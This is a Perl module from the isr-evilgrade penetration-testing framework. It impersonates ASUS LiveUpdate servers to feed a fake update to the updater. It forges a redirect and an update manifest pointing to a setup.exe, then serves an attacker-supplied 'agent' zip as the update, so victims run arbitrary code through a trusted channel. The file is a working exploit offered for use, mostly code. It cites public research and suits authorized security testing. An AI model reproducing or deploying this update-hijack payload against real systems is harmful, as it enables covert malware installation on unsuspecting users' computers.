###############
# asus.pm
#
# Copyright 2016 Matias Ariel Re Medina
#
# Info
# Duo.com:
# https://duo.com/assets/pdf/out-of-box-exploitation_oem-updaters.pdf
# http://teletext.zaibatsutel.net/post/145370716258/deadupdate-or-how-i-learned-to-stop-worrying-and
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::asus;

use strict;
use Data::Dump qw(dump);
use File::Basename;

my $base = {
    'name'        => 'asus',
    'version'     => '1.0',
    'appver'      => 'All',
    'author'      => ['Matias Ariel Re Medina <mre[at]faradaysec[dot]com>'],
    'description' => qq{Asus's LiveUpdate},
    'vh'          => '(dlcdnet.asus.com|liveupdate01.asus.com)',
    'request'     => [
        {   'req' => '/pub/ASUS/LiveUpdate/Release\/[\w+%-\/]*.ide'
            ,    #regex friendly
            'type'    => 'string',                  #file|string|agent|install
            'method'  => '',                        #any
            'bin'     => '',
            'string'  => '',
            'parse'   => '1',
            'file'    => '',
            'cheader' => "HTTP/1.1 302 Found\r\n"
                . "Location: http://liveupdate01.asus.com/<%URL_FILE%>.idx \r\n"
                . "Content-Length: 0 \r\n"
                . "Connection: close \r\n\r\n",
        },
        {   'req' => '\.idx',  #'/pub/ASUS/LiveUpdate/Release\/[\w+%-\/]*.idx'
            ,                  #regex friendly
            'type'   => 'string',    #file|string|agent|install
            'method' => '',          #any
            'bin'    => '0',
            'string' => '<product name="<%URL_FILE%>">

<item name="<%UPDATE%>">
<description l_id="1033" title="<%UPDATE%>"><%UPDATE%></description>
<description l_id="1028" title="<%UPDATE%>"><%UPDATE%></description>
<description l_id="2052" title="<%UPDATE%>"><%UPDATE%></description>
<type> AP </type>
<os> Win10,Win10(64),Win7,Win7(64),Win8_1,Win8_1(64),Win8(64),WinXP </os>
<version> <%VERSION%> </version>
<size> <%AGENTSIZE%> </size>
<release-date> <%TIME%> </release-date>
<zip-path> pub/ASUS/nb/Apps/Updates/<%ZIPNAME%>.zip</zip-path>
<execute> .\setup.exe </execute>
<index> 1 </index>
<reboot> 0 </reboot>
<severity> 1 </severity>
<reboot_uninstall> 0 </reboot_uninstall>
</item>

</product>
',
            'parse' => '1',
            'file'  => '',
        },
        {   'req'    => '.zip',     #regex friendly
            'type'   => 'agent',    #file|string|agent|install
            'method' => '',         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/ASUSagent.zip',
            'desc' => 'Agent to inject'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'zipname' => {
            'val'  => 'AsusUpdt_V7234',
            'desc' => qq{'Zip's name.'}
        },
        'version' => {
            'val'  => 'V7.2.34',
            'desc' => 'Version of the update.'
        },
        'update' => {
            'val'  => 'ASUS Update',
            'desc' => 'Update name.'
        },
        'time' => {
            'val'     => time,
            'hidden'  => 0,
            'dynamic' => 1
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
